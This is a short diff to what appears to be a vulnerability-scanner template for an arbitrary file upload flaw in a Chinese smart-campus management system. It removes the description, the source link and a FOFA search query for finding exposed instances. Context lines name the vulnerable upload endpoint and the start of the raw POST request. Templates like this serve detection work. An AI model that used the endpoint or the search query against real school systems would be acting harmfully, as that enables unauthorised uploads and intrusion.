@@ -3,12 +3,8 @@ info:
   name: 智慧校园(安校易)管理系统 FileUpTitle存在任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/qygoxhy1r95qsnar'
+  description: ''
   tags: file-upload,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: qygoxhy1r95qsnar
-    fofa: title="智慧综合管理平台登入"
 http:
 - raw:
   - 'POST /Module/FileUpPage/FileUpTitle.aspx?file_tmid=DudeSuite HTTP/1.1
